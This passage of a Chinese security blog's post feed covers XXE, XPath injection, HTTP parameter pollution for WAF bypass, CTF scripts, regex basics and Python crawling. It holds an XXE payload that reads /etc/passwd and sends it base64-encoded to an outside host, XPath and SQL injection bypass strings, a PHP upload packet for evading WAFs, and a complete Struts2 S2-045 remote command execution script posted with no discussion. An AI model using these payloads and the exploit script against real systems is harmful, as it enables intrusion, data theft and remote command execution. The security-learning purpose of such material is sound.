&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/etc/passwd&quot;&gt; &lt;!ENTITY % dtd SYSTEM &quot;http://www.hackersb.cn/attack.dtd&quot;&gt; %dtd; %mydata; ]&gt; 其中attack.dtd的内容为： &lt;!ENTITY % all&quot;&lt;!ENTITY &amp;#x25; mydata SYSTEM &quot;http://www.hackersb.cn/?%file&quot;&gt;&quot; //base64加密之后然后带着参数访问，在日志中可以看到 编码之后的文件数据。 xml造成的ssrf注入linux 本地ssrf测试探测开放端口 利用nc 可本地测试是否能够连接 windows 本地ssrf探测内网端口测试&lt;?xml version=”1.0” encoding=”utf-8”?&gt; &lt;!DOCTYPE xxe [&lt;!ELEMENT name ANY &gt;&lt;!ENTITY xxe SYSTEM “http://127.0.0.1:80&quot; &gt;]&gt; &xxe; 开启报错 如果端口开放 则显示正常 如果端口关闭 则显示主机拒绝访问 Xpath注入Xpath是类似SQL的一种从XML结构中搜索节点数据的语言（DSL），其注入放手就是构造完整可执行的DSL，本质与SQL注入一样。 简单理解xpath就是在xml文件里找东西的。可以这么理解，xml就是个类似数据库的东西而xpath实际上就是数据库查询！ Xpath定义XPath注入攻击是指利用XPath 解析器的松散输入和容错特性，能够在 URL、表单或其它信息上附带恶意的XPath 查询代码，以获得权限信息的访问权并更改这些信息。XPath注入攻击是针对Web服务应用新的攻击方法，它允许攻击者在事先不知道XPath查询相关知 识的情况下，通过XPath查询得到一个XML文档的完整内容。 xpath一般的危害为越权查看xml数据库信息， 添加admin账户 绕过登录以admin身份登录 等 XPath注入攻击特点XPath注入攻击利用两种技术，即XPath扫描和 XPath查询布尔化。通过该攻击，攻击者可以控制用来进行XPath查询的XML数据库。这种攻击可以有效地对付使用XPath查询（和XML数据库） 来执行身份验证、查找或者其它操作。XPath注入攻击同SQL注入攻击类似，但和SQL注入攻击相比较，XPath在以下方面具有优势。 （1） 广泛性。XPath注入攻击利用的是XPath语法，由于XPath是一种标准语言，因此只要是利用XPath语法的Web 应用程序如果未对输入的 XPath查询做严格的处理都会存在XPath注入漏洞，所以可能在所有的XPath实现中都包含有该弱点，这和SQL注入攻击有 很大区别。在SQL注入 攻击过程中根据数据库支持的SQL语言不同，注入攻击的实现可能不同。 （2） 危害性大。XPath语言几乎可以引用XML文档的所有部分，而这样的引用一般没有访问控制限制。但在SQL注入攻击中，一个“用户”的权限 可能被限制到 某一特定的表、列或者查询，而XPath注入攻击可以保证得到完整的XML文档，即完整的数据库。只要Web服务应用具有基本的 安全漏洞，即可构造针对 XPath应用的自动攻击。 xpath基本语法表达式 描述 nodename 选取此节点的所有子节点。 / 从根节点选取。 // 从匹配选择的当前节点选择文档中的节点，而不考虑它们的位置。 . 选取当前节点。 .. 选取当前节点的父节点。 @ 选取属性。 路径表达式 结果 bookstore 选取 bookstore 元素的所有子节点。 /bookstore 选取根元素 bookstore。 注释：假如路径起始于正斜杠( / )，则此路径始终代表到某元素的绝对路径！ bookstore/book 选取属于 bookstore 的子元素的所有 book 元素。 //book 选取所有 book 子元素，而不管它们在文档中的位置。 bookstore//book 选择属于 bookstore 元素的后代的所有 book 元素，而不管它们位于 bookstore 之下的什么位置。 //@lang 选取名为 lang 的所有属性。 通配符 描述 * 匹配任何元素节点。 @* 匹配任何属性节点。 node() 匹配任何类型的节点。 Xpath注入攻击原理 XPath注入攻击主要是通过构建特殊的输入，这些输入往往是XPath语法中的一些组合，这些输入将作为参数传入Web 应用程序，通过执行XPath查询而执行入侵者想要的操作，下面以登录验证中的模块为例，说明 XPath注入攻击的实现原理。 在Web 应用程序的登录验证程序中，一般有用户名（username）和密码（password） 两个参数，程序会通过用户所提交输入的用户名和密码来执行授权操作。若验证数据存放在XML文件中，其原理是通过查找user表中的用户名 （username）和密码（password）的结果来进行授权访问， &lt;users&gt; &lt;user&gt; &lt;firstname&gt;Ben&lt;/firstname&gt; &lt;lastname&gt;Elmore&lt;/lastname&gt; &lt;loginID&gt;abc&lt;/loginID&gt; &lt;password&gt;test123&lt;/password&gt; &lt;/user&gt; &lt;user&gt; &lt;firstname&gt;Shlomy&lt;/firstname&gt; &lt;lastname&gt;Gantz&lt;/lastname&gt; &lt;loginID&gt;xyz&lt;/loginID&gt; &lt;password&gt;123test&lt;/password&gt; &lt;/user&gt; 但是，可以采用如下的方法实施注入攻击，绕过身份验证。如果用 户传入一个 login 和 password，例如 loginID = ‘xyz’ 和 password = ‘123test’，则该查询语句将返回 true。但如果用户传入类似 ‘ or 1=1 or ‘’=’ 的值，那么该查询语句也会得到 true 返回值，因为 XPath 查询语句最终会变成如下代码： //users/user[loginID/text()=’’or 1=1 or ‘’=’’ and password/text()=’’ or 1=1 or ‘’=’’] 这个字符串会在逻辑上使查询一直返回 true 并将一直允许攻击者访问系统。攻击者可以利用 XPath 在应用程序中动态地操作 XML 文档。攻击完成登录可以再通过XPath盲入技术获取最高权限帐号和其它重要文档信息。 bwapp测试xpath常用语句 查询所有节点内容Exp:score.php?user=vk’] | // | // [‘重点为：vk’] | // | // [‘一般用 //* 来匹配所有节点。这样一下子查出所有的信息！为什么说xpath更像拼字游戏呢？就在这了，你得完全拼上本来的查询语句，不然就会出错，而且这个还没有注释，不能像sql注入一样，用注释杀掉后面语句 首先单引号闭合前面，] 也是闭合前面| 这个表示分别执行，有点像union select，这个符号前后的路径都去查询 //* 前面提到过，匹配所有节点 |//*[‘ 闭合后面 登陆框 这个登录界面访问权限是通过xpath去读取xml文件来实现的。换句话说，你输入账号密码，他就把xml文件里的合法账号密码拿出来和你填写的进行比对，如果一致就通过。 也可以使用万能密码 登录 ‘or’1’=’1‘or’1’=’1即可登录成功 #查询 执行 genre=action’] | // | //[‘ &amp;action=search 会出现报错 加括号exp：genre=action’)] | // | //[(‘ &amp;action=search 危害 泄露所有节点的数据。 XXE-CTF实战1.EIS-2018ctf挑战赛]]></content>
      <tags>
        <tag>渗透攻防</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[sql注入之参数污染绕waf]]></title>
    <url>%2F2018%2F10%2F10%2Fsql%E6%B3%A8%E5%85%A5%E4%B9%8B%E5%8F%82%E6%95%B0%E6%B1%A1%E6%9F%93%E7%BB%95waf%2F</url>
    <content type="text"><![CDATA[hpp参数污染了解HPP是HTTP Parameter Pollution的缩写。这个漏洞由S. di Paola 与L. Caret Toni在2009年的OWASP上首次公布。这也是一种注入型的漏洞，攻击者通过在HTTP请求中插入特定的参数来发起攻击。如果Web应用中存在这样的漏洞，可以被攻击者利用来进行客户端或者服务器端的攻击。通过hpp参数污染可以达到绕过sqlwaf，上传waf来进行攻击。 hpp参数污染原理在跟服务器交互的过程中，http允许 get 或者post多次传同一参数值，造成覆盖达到一些绕过waf的效果。 GET /foo?par1=val1&amp;par2=val2 HTTP/1.1 User-Agent: Mozilla/5.0 Host: Host Accept: */* 如上面的http请求，一般同一参数名字只能传参一次，但是http协议中允许同样名称的参数出现多次。 但是不同的服务器处理方式会不一样，比如：必应 我们输入了两次q参数，第一次为aa第二次为bb被覆盖了， 谷歌 输入两个q参数可以看到都被加载到了浏览器搜索中。没有覆盖 如果同时提供2个搜索的关键字参数给Google，那么Google会对2个参数都进行查询；但是必应则不一样，它只会处理后面一个参数。下面这个表简单列举了一些常见的Web服务器对同样名称的参数出现多次的处理方式： Web服务器 参数获取函数 获取到的参数 PHP/Apache $_GET(“par”) Last JSP/Tomcat Request.getParameter(“par”) First Perl(CGI)/Apache Param(“par”) First Python/Apache getvalue(“par”) All (List) ASP/IIS Request.QueryString(“par”) All (comma-delimited string) 参数污染实例waf绕过这种服务器的解析方式本身没有什么缺陷，但是如果配合一些waf规则以及其他规则，则有可能造成一些危害，根据waf解析的先后规则则有可能绕过waf设置的原意。 $sql = &quot;select * from admin where id=1&quot;; $sql=$sql.&quot;&quot;.$_POST[&apos;bbs&apos;]; echo $sql; $pattern=&apos;/^.*union.*$/&apos;; if(preg_match($pattern, $sql)) {echo &quot;注入测试 &quot;;} 在特定情况下 bbs=u&amp;bbs=n&amp;bbs=i&amp;bbs=o&amp;bbs=n&amp;bbs=select 1,user(),3可以绕过一些waf，在CTF中也有出现。将参数分离写入，waf在输入之后就开始拦截，在后端又拼接成完整的union，根据一些特定服务器就可以绕过waf进行注入。 文件上传先看一个上传数据包。 POST /upload.php HTTP/1.1 Host: 192.168.1.100 User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:51.0) Gecko/20100101 Firefox/51.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate Referer: http://192.168.1.100/ Cookie:yunsuo_session_verify=1a9c7117538a7a9bce39a4695ff3f0cc; safedog-flow-item= X-Forwarded-For: 1.1.1.1 CLIENT_IP: 2.2.2.2 Connection: keep-alive Upgrade-Insecure-Requests: 1 Content-Type:multipart/form-data; boundary=---------------------------440470572354 Content-Length: 1089 -----------------------------440470572354 Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;n.php&quot; Content-Type: application/octet-stream &lt;?php Phpinfo(); ?&gt; -----------------------------440470572354 Content-Disposition: form-data; name=&quot;submit&quot; Submit -----------------------------440470572354-- Content-Type:multipart/form-data; 指代的是这个数据是来自表单提交的 某些WAF是通过Content-Type识别是否是文件上传数据包。假设我们将Content-Type更改，数据包也是正常提交过去的。这个就完成了一次bypass。 还有的时候就是Content-Disposition: form-data;，也有某些WAF是根据Content-Disposition匹配filename的，用于验证黑名单。我们经过混淆大小写也是可以bypass的。(http://www.secpulse.com/archives/56523.html) 拦截： 在HPP中最典型的的例子就是“双文件上传”。 就是在协议中，提交两个相同的值，达到欺骗WAF一次匹配的目的。在这里提点一下http协议中参数名与参数值的结构。 可以看到filename参数写了两次，可能绕过一些上传限制。 xss当然这种特性有时候也可以测试xss漏洞，原理一样。暂不测试。]]></content>
      <tags>
        <tag>渗透攻防</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[S2-045脚本]]></title>
    <url>%2F2018%2F09%2F13%2FS2-045%E6%BC%8F%E6%B4%9E%E8%84%9A%E6%9C%ACcmd%2F</url>
    <content type="text"><![CDATA[#不BB贴脚本 #!/usr/bin/python # -*- coding: utf-8 -*- import urllib2 import httplib url=&quot;http://192.168.2.203/login.action&quot; def exploit(url, cmd): payload = &quot;%{(#_=&apos;multipart/form-data&apos;).&quot; payload += &quot;(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).&quot; payload += &quot;(#_memberAccess?&quot; payload += &quot;(#_memberAccess=#dm):&quot; payload += &quot;((#container=#context[&apos;com.opensymphony.xwork2.ActionContext.container&apos;]).&quot; payload += &quot;(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).&quot; payload += &quot;(#ognlUtil.getExcludedPackageNames().clear()).&quot; payload += &quot;(#ognlUtil.getExcludedClasses().clear()).&quot; payload += &quot;(#context.setMemberAccess(#dm)))).&quot; payload += &quot;(#cmd=&apos;%s&apos;).&quot; % cmd payload += &quot;(#iswin=(@java.lang.System@getProperty(&apos;os.name&apos;).toLowerCase().contains(&apos;win&apos;))).&quot; payload += &quot;(#cmds=(#iswin?{&apos;cmd.exe&apos;,&apos;/c&apos;,#cmd}:{&apos;/bin/bash&apos;,&apos;-c&apos;,#cmd})).&quot; payload += &quot;(#p=new java.lang.ProcessBuilder(#cmds)).&quot; payload += &quot;(#p.redirectErrorStream(true)).(#process=#p.start()).&quot; payload += &quot;(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).&quot; payload += &quot;(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).&quot; payload += &quot;(#ros.flush())}&quot; try: headers = {&apos;User-Agent&apos;: &apos;Mozilla/5.0&apos;, &apos;Content-Type&apos;: payload} request = urllib2.Request(url, headers=headers) page = urllib2.urlopen(request).read() except httplib.IncompleteRead, e: page = e.partial print(page) return page command=raw_input(&quot;pleace put you command:&quot;) exploit(url,command) 脚本效果：]]></content>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CTF-python练习]]></title>
    <url>%2F2018%2F09%2F02%2FCTF-python%2F</url>
    <content type="text"><![CDATA[BUGKU-速度要快题目网址:http://120.24.86.145:8002/web6/ 速度要快，查看源码，暗示要post传递一个参数，先抓包，发现headers头有flag，需要base64解码。然后post传递参数返回flag。 贴出源码： import requests from base64 import b64decode s=requests.Session() #保证一个session这样才能根据给出的随机flag匹配最终flag a=s.get(&apos;http://120.24.86.145:8002/web6/&apos;).headers[&apos;flag&apos;] flag=b64decode(a).decode()#解码headers中的flag，但是解码出来需要decode再次解码。 key=b64decode(flag.split(&apos;:&apos;)[1])#解码出内容为：跑的还不错，给你flag吧: ODgzMTc= ，需要截取:右边内容所以用到split截取以冒号分割的第二个内容。 payload={&apos;margin&apos;:key} r=s.post(&apos;http://120.24.86.145:8002/web6/&apos;,data=payload) print(r.text) 天下武功唯快不破题目网址：http://ctf5.shiyanbar.com/web/10/10.php 贴出源码： url=&apos;http://ctf5.shiyanbar.com/web/10/10.php&apos; s=requests.Session()#保证一个session会话 res=base64.b64decode(s.get(url).headers[&apos;flag&apos;]).decode()#对flag进行解码编码等操作 a=res.split(&apos;:&apos;)[1]#分离出需要的信息 payload={&apos;key&apos;:a} b=s.post(url,data=payload) print(b.text) 思路 抓包 源码 解码64 脚本post发包 秋名山老司机http://120.24.86.145:8002/qiumingshan/ 贴出源码： url=&apos;http://120.24.86.145:8002/qiumingshan/&apos; s=requests.Session()#保证在极短时间内提交是一个会话 r=s.get(url)#get url里的表达式 matchp=re.search(r&apos;(\d+[+\-*]+)+\d+&apos;,r.text).group() res=eval(matchp) data={&apos;value&apos;:res} result = s.post(url,data=data) print(result.text) 很单纯的一道python脚本计算题目, ，group()为打印出此表达式给matchp，用正则表达式，\d+表示一个或者多个数字，[]里为任意一个字符，这里为匹配+-*，-需要转义，将这两项括号括起来+，这样才可以匹配多个这样类型的表达式，最后加上一个\d+。 eval(expression, globals=None, locals=None) — 官方文档中的解释是，将字符串str当成有效的表达式来求值并返回计算结果。globals和locals参数是可选的，如果提供了globals参数，那么它必须是dictionary类型；如果提供了locals参数，那么它可以是任意的map对象。 最后post传递得到flag， import hashlib def md5(data): m=hashlib.md5() m.update(data) a=m.hexdigest() return a a=&apos;ichunqiu&apos; b=&apos;abcdefghijklmnopqrstuvwxyz1234567890&apos; for i in b: for j in b: for k in b: for l in b: for m in b: if md5(a+i+j+k+l+m)==&apos;5a2a7d385fdaad3fabbe7b11c28bd48e&apos;: print a+i+j+k+l+m 要破解ichunqiu 后面的后五位然后 post传递 传送门：文章]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[正则表达式基础]]></title>
    <url>%2F2018%2F09%2F02%2F%E6%AD%A3%E5%88%99%E5%9F%BA%E7%A1%80%2F</url>
    <content type="text"><![CDATA[正则正则表达式，又称规则表达式。（英语：Regular Expression，在代码中常简写为regex、regexp或RE），计算机科学的一个概念。正则表达式通常被用来检索、替换那些符合某个模式(规则)的文本，用事先定义好的一些特定字符、及这些特定字符的组合，组成一个“规则字符串”，这个“规则字符串”用来表达对字符串的一种过滤逻辑。 正则表达式的大致匹配过程是： 依次拿出表达式和文本中的字符比较， 如果每一个字符都能匹配，则匹配成功；一旦有匹配不成功的字符则匹配失败。 如果表达式中有量词或边界，这个过程会稍微有一些不同。 正则表达式python的语法规则元字符 说明 . 代表任意字符 \ [ ] 匹配内部的任一字符或子表达式 [^] 对字符集和取非 - 定义一个区间 \ 对下一字符取非（通常是普通变特殊，特殊变普通） * 匹配前面的字符或者子表达式0次或多次 *? 惰性匹配上一个 + 匹配前一个字符或子表达式一次或多次 +? 惰性匹配上一个 ? 匹配前一个字符或子表达式0次或1次重复 {n} 匹配前一个字符或子表达式 {m,n} 匹配前一个字符或子表达式至少m次至多n次 {n,} 匹配前一个字符或者子表达式至少n次 {n,}? 前一个的惰性匹配 ^ 匹配字符串的开头 \A 匹配字符串开头 $ 匹配字符串结束 [\b] 退格字符 \c 匹配一个控制字符 \d 匹配任意数字 \D 匹配数字以外的字符 \t 匹配制表符 \w 匹配任意数字字母下划线 \W 不匹配数字字母下划线 一、校验数字的表达式 数字：^[0-9]*$ n位的数字：^\d{n}$ 至少n位的数字：^\d{n,}$ m-n位的数字：^\d{m,n}$ 零和非零开头的数字：^(0|[1-9][0-9]*)$ 非零开头的最多带两位小数的数字：^([1-9][0-9]*)+(.[0-9]{1,2})?$ 带1-2位小数的正数或负数：^(\-)?\d+(\.\d{1,2})?$ 正数、负数、和小数：^(\-|\+)?\d+(\.\d+)?$ 有两位小数的正实数：^[0-9]+(.[0-9]{2})?$ 有1~3位小数的正实数：^[0-9]+(.[0-9]{1,3})?$ 非零的正整数：^[1-9]\d*$ 或 ^([1-9][0-9]*){1,3}$ 或 ^\+?[1-9][0-9]*$ 非零的负整数：^\-[1-9][]0-9″*$ 或 ^-[1-9]\d*$ 非负整数：^\d+$ 或 ^[1-9]\d*|0$ 非正整数：^-[1-9]\d*|0$ 或 ^((-\d+)|(0+))$ 非负浮点数：^\d+(\.\d+)?$ 或 ^[1-9]\d*\.\d*|0\.\d*[1-9]\d*|0?\.0+|0$ 非正浮点数：^((-\d+(\.\d+)?)|(0+(\.0+)?))$ 或 ^(-([1-9]\d*\.\d*|0\.\d*[1-9]\d*))|0?\.0+|0$ 正浮点数：^[1-9]\d*\.\d*|0\.\d*[1-9]\d*$ 或 ^(([0-9]+\.[0-9]*[1-9][0-9]*)|([0-9]*[1-9][0-9]*\.[0-9]+)|([0-9]*[1-9][0-9]*))$ 负浮点数：^-([1-9]\d*\.\d*|0\.\d*[1-9]\d*)$ 或 ^(-(([0-9]+\.[0-9]*[1-9][0-9]*)|([0-9]*[1-9][0-9]*\.[0-9]+)|([0-9]*[1-9][0-9]*)))$ 浮点数：^(-?\d+)(\.\d+)?$ 或 ^-?([1-9]\d*\.\d*|0\.\d*[1-9]\d*|0?\.0+|0)$ 二、校验字符的表达式 汉字：^[\u4e00-\u9fa5]{0,}$ 英文和数字：^[A-Za-z0-9]+$ 或 ^[A-Za-z0-9]{4,40}$ 长度为3-20的所有字符：^.{3,20}$ 由26个英文字母组成的字符串：^[A-Za-z]+$ 由26个大写英文字母组成的字符串：^[A-Z]+$ 由26个小写英文字母组成的字符串：^[a-z]+$ 由数字和26个英文字母组成的字符串：^[A-Za-z0-9]+$ 由数字、26个英文字母或者下划线组成的字符串：^\w+$ 或 ^\w{3,20}$ 中文、英文、数字包括下划线：^[\u4E00-\u9FA5A-Za-z0-9_]+$ 中文、英文、数字但不包括下划线等符号：^[\u4E00-\u9FA5A-Za-z0-9]+$ 或 ^[\u4E00-\u9FA5A-Za-z0-9]{2,20}$ 可以输入含有^%&amp;’,;=?$\”等字符：[^%&amp;&apos;,;=?$\x22]+ 禁止输入含有~的字符：[^~\x22]+ 三、特殊需求表达式 Email地址：^\w+([-+.]\w+)*@\w+([-.]\w+)*\.\w+([-.]\w+)*$ 域名：[a-zA-Z0-9][-a-zA-Z0-9]{0,62}(/.[a-zA-Z0-9][-a-zA-Z0-9]{0,62})+/.? InternetURL：[a-zA-z]+://[^\s]* 或 ^http://([\w-]+\.)+[\w-]+(/[\w-./?%&amp;=]*)?$ 手机号码：^(13[0-9]|14[5|7]|15[0|1|2|3|5|6|7|8|9]|18[0|1|2|3|5|6|7|8|9])\d{8}$ 电话号码(“XXX-XXXXXXX”、”XXXX-XXXXXXXX”、”XXX-XXXXXXX”、”XXX-XXXXXXXX”、”XXXXXXX”和”XXXXXXXX)：^($$\d{3,4}-)|\d{3.4}-)?\d{7,8}$ 国内电话号码(0511-4405222、021-87888822)：\d{3}-\d{8}|\d{4}-\d{7} 身份证号(15位、18位数字)：^\d{15}|\d{18}$ 短身份证号码(数字、字母x结尾)：^([0-9]){7,18}(x|X)?$ 或 ^\d{8,18}|[0-9x]{8,18}|[0-9X]{8,18}?$ 帐号是否合法(字母开头，允许5-16字节，允许字母数字下划线)：^[a-zA-Z][a-zA-Z0-9_]{4,15}$ 密码(以字母开头，长度在6~18之间，只能包含字母、数字和下划线)：^[a-zA-Z]\w{5,17}$ 强密码(必须包含大小写字母和数字的组合，不能使用特殊字符，长度在8-10之间)：^(?=.*\d)(?=.*[a-z])(?=.*[A-Z]).{8,10}$ 日期格式：^\d{4}-\d{1,2}-\d{1,2} 一年的12个月(01～09和1～12)：^(0?[1-9]|1[0-2])$ 一个月的31天(01～09和1～31)：^((0?[1-9])|((1|2)[0-9])|30|31)$ 钱的输入格式： 有四种钱的表示形式我们可以接受:”10000.00″ 和 “10,000.00″, 和没有 “分” 的 “10000″ 和 “10,000″：^[1-9][0-9]*$ 这表示任意一个不以0开头的数字，但是，这也意味着一个字符”0″不通过，所以我们采用下面的形式：^(0|[1-9][0-9]*)$ 一个0或者一个不以0开头的数字.我们还可以允许开头有一个负号：^(0|-?[1-9][0-9]*)$ 这表示一个0或者一个可能为负的开头不为0的数字.让用户以0开头好了.把负号的也去掉，因为钱总不能是负的吧.下面我们要加的是说明可能的小数部分：^[0-9]+(.[0-9]+)?$ 必须说明的是，小数点后面至少应该有1位数，所以”10.”是不通过的，但是 “10″ 和 “10.2″ 是通过的：^[0-9]+(.[0-9]{2})?$ 这样我们规定小数点后面必须有两位，如果你认为太苛刻了，可以这样：^[0-9]+(.[0-9]{1,2})?$ 这样就允许用户只写一位小数。下面我们该考虑数字中的逗号了，我们可以这样：^[0-9]{1,3}(,[0-9]{3})*(.[0-9]{1,2})?$ 1到3个数字，后面跟着任意个 逗号+3个数字，逗号成为可选，而不是必须：^([0-9]+|[0-9]{1,3}(,[0-9]{3})*)(.[0-9]{1,2})?$ 备注：这就是最终结果了，别忘了”+”可以用”*”替代。如果你觉得空字符串也可以接受的话(奇怪，为什么?)最后，别忘了在用函数时去掉去掉那个反斜杠，一般的错误都在这里 xml文件：^([a-zA-Z]+-?)+[a-zA-Z0-9]+\\.[x|X][m|M][l|L]$ 中文字符的正则表达式：[\u4e00-\u9fa5] 双字节字符：[^\x00-\xff] (包括汉字在内，可以用来计算字符串的长度(一个双字节字符长度计2，ASCII字符计1)) 空白行的正则表达式：\n\s*\r (可以用来删除空白行) HTML标记的正则表达式：&lt;(\S*?)[^&gt;]*&gt;.*?&lt;/\1&gt;|&lt;.*? /&gt; (网上流传的版本太糟糕，上面这个也仅仅能部分，对于复杂的嵌套标记依旧无能为力) 首尾空白字符的正则表达式：^\s*|\s*$或(^\s*)|(\s*$) (可以用来删除行首行尾的空白字符(包括空格、制表符、换页符等等)，非常有用的表达式) 腾讯QQ号：[1-9][0-9]{4,} (腾讯QQ号从10000开始) 中国邮政编码：[1-9]\d{5}(?!\d) (中国邮政编码为6位数字) IP地址：\d+\.\d+\.\d+\.\d+ (提取IP地址时有用) IP地址：((?:(?:25[0-5]|2[0-4]\\d|[01]?\\d?\\d)\\.){3}(?:25[0-5]|2[0-4]\\d|[01]?\\d?\\d)) (由@飞龙三少 提供，感谢共享) 语法规则附带实例 反斜杠问题与大多数编程语言相同，正则表达式里使用”\”作为转义字符，这就可能造成反斜杠困扰。假如你需要匹配文本中的字符”\”，那么使用编程语言表示的正则表达式里将需要4个反斜杠”\\”：前两个和后两个分别用于在编程语言里转义成反斜杠，转换成两个反斜杠后再在正则表达式里转义成一个反斜杠。 Python里的原生字符串很好地解决了这个问题，这个例子中的正则表达式可以使用r”\”表示。同样，匹配一个数字的”\d”可以写成r”\d”。有了原生字符串，妈妈也不用担心是不是漏写了反斜杠，写出来的表达式也更直观勒 re模块Python 自带了re模块，它提供了对正则表达式的支持。主要用到的方法列举如下: #返回pattern对象 re.compile(string[,flag]) #以下为匹配所用函数 re.match(pattern, string[, flags]) re.search(pattern, string[, flags]) re.split(pattern, string[, maxsplit]) re.findall(pattern, string[, flags]) re.finditer(pattern, string[, flags]) re.sub(pattern, repl, string[, count]) re.subn(pattern, repl, string[, count]) Python通过re模块提供对正则表达式的支持。使用re的一般步骤是先将正则表达式的字符串形式编译为Pattern实例，然后使用Pattern实例处理文本并获得匹配结果（一个Match实例），最后使用Match实例获得信息，进行其他的操作。 pattern可以理解为一个匹配模式，那么我们怎么获得这个匹配模式呢？很简单，我们需要利用re.compile方法就可以。例如:pattern = re.compile(r’hello’) 在参数中我们传入了原生字符串对象，通过compile方法编译生成一个pattern对象，然后我们利用这个对象来进行进一步的匹配。另外大家可能注意到了另一个参数 flags，在这里解释一下这个参数的含义： 参数flag是匹配模式，取值可以使用按位或运算符’|’表示同时生效，比如re.I | re.M。 可选值有: • re.I(全拼：IGNORECASE): 忽略大小写（括号内是完整写法，下同） • re.M(全拼：MULTILINE): 多行模式，改变&apos;^&apos;和&apos;$&apos;的行为（参见上图） • re.S(全拼：DOTALL): 点任意匹配模式，改变&apos;.&apos;的行为 • re.L(全拼：LOCALE): 使预定字符类 \w \W \b \B \s \S 取决于当前区域设定 • re.U(全拼：UNICODE): 使预定字符类 \w \W \b \B \s \S \d \D 取决于unicode定义的字符属性 • re.X(全拼：VERBOSE): 详细模式。这个模式下正则表达式可以是多行，忽略空白字符，并可以加入注释。 简单匹配# _*_ coding: UTF-8 _*_ import re pattern=re.compile(r&apos;hello&apos;,re.IGNORECASE) # 将正则表达式编译成Pattern对象,不区分大小写re.IGNORECASE result1=re.match(pattern,&apos;hello1&apos;) #或result1 = pattern.match(&apos;hello world!&apos;) if result1: print(result1.group()) else: print(&apos;匹配失败&apos;） re.match和re.search的区别re.match只匹配字符串的开始，如果字符串开始不符合正则表达式，则匹配失败，函数返回None；而re.search匹配整个字符串，直到找到一个匹配。 import re line = &quot;Cats are smarter than dogs&quot;; matchObj = re.match( r&apos;dogs&apos;, line, re.M|re.I) if matchObj: print &quot;match --&gt; matchObj.group() : &quot;, matchObj.group() else: print &quot;No match!!&quot; matchObj = re.search( r&apos;dogs&apos;, line, re.M|re.I) if matchObj: print &quot;search --&gt; matchObj.group() : &quot;, matchObj.group() else: print &quot;No match!!&quot; 参考：文章 参考：文章]]></content>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[markdownpad基本使用]]></title>
    <url>%2F2018%2F08%2F31%2Fmarkdownpad%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8%2F</url>
    <content type="text"><![CDATA[#markdown基本使用命令 基本命令 ctrl+1 一级标题 ctrl+2 二级标题共六级标题 ctrl+shift+o 有序列表 ctrl+u 无序列表 ctrl+g 插入图片 ctrl+l 插入超链接 插入连接[baidu](http://baidu.com) 例：baidu 插入图片 Markdown 的粗体和斜体也非常简单，用两个 包含一段文本就是粗体的语法，用一个包含一段文本就是斜体的语法。 代码框 只需要用两个 ` 把中间的代码包裹起来，如 code 分割线 只需要连续输入三个***或者—。 快捷键 加粗 Ctrl + B 斜体 Ctrl + I 引用 Ctrl + Q 插入链接 Ctrl + L 插入代码 Ctrl + K 插入图片 Ctrl + G 提升标题 Ctrl + H 有序列表 Ctrl + O 无序列表 Ctrl + U 横线 Ctrl + R 撤销 Ctrl + Z 重做 Ctrl + Y 参考：文章]]></content>
      <tags>
        <tag>杂</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[爬虫基础]]></title>
    <url>%2F2018%2F08%2F31%2F%E7%88%AC%E8%99%AB%E5%9F%BA%E7%A1%80%2F</url>
    <content type="text"><![CDATA[#python爬虫基础 python requests常用库文章链接 python2.x与3.xurllib库在python2与python3中的区别 Urllib是python提供的一个用于操作url的模块。 在python2中，有urllib库和urllib2库。在python3中，urllib2合并到urllib库中,我们爬取网页的时候，经常用到这个库。 升级合并后，模块中包的位置变化的地方较多。 以下是python2与python3中常用的关于urllib库的变化： 1.在python2中使用import urllib2————对应的，在python3中会使用import urllib.request,urllib.error 2.在python2中使用import urllib————对应的，在python3中会使用import urllib.request,urllib.error,urllib.parse 3.在python2中使用import urlparse————对应的，在python3中会使用import urllib.parse 4.在python2中使用urllib2.urlopen————对应的，在python3中会使用urllib.request.urlopen 5.在python2中使用urllib.urlencode————对应的，在python3中会使用urllib.parse.urlencode 6.在python2中使用urllib.quote————对应的，在python3中会使用urllib.request.quote 7.在python2中使用cookielib.CookieJar————对应的，在python3中会使用http.CookieJar 8.在python2中使用urllib2.Request————对应的，在python3中会使用urllib.request.Request 9.cookielib 用 http.cookiejar 代替 10.print “ “ 用 print(“ “) 代替 11.urllib2.URLError 用 urllib.error.URLError 代替 12.urllib2.HTTPError 用 urllib.error.HTTPError 代替 13.except urllib2.URLError, e: 用 except urllib.error.URLError as e: 代替 14.response.text返回的是Unicode类型的数据， response.content返回的是buyes型也就是二进制的数据 参考：文章 简单测试爬行from urllib.request import urlopen response = urlopen(&quot;http://www.baidu.com&quot;) a=response.read() print(a)//3.x版本print已经是一个函数，所以需要加括号 上述代码就可轻松爬行出baidu的网页源码 首先我们调用的是urllib2库里面的urlopen方法，传入一个URL,urlopen函数是有三个参数的，urlopen(url,data,timeout)url为需要打开的网址data为要传输的数据如post或者get参数timeout延迟设置 headers设置模拟浏览器 有些网站不会同意程序直接用上面的方式进行访问，如果识别有问题，那么站点根本不会响应，所以为了完全模拟浏览器的工作，我们需要设置一些Headers 的属性，agent就是请求的身份，如果没有写入请求身份，那么服务器不一定会响应，所以可以在headers中设置agent。防盗链的时候服务器会识别headers中的refer是不是它自己，如果不是，服务器不会响应，所以我们需要在headers加入refer。例： headers = { &apos;User-Agent&apos; : &apos;Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)&apos;,&apos;Referer&apos;:&apos;http://www.zhihu.com/articles&apos; } 代理设置 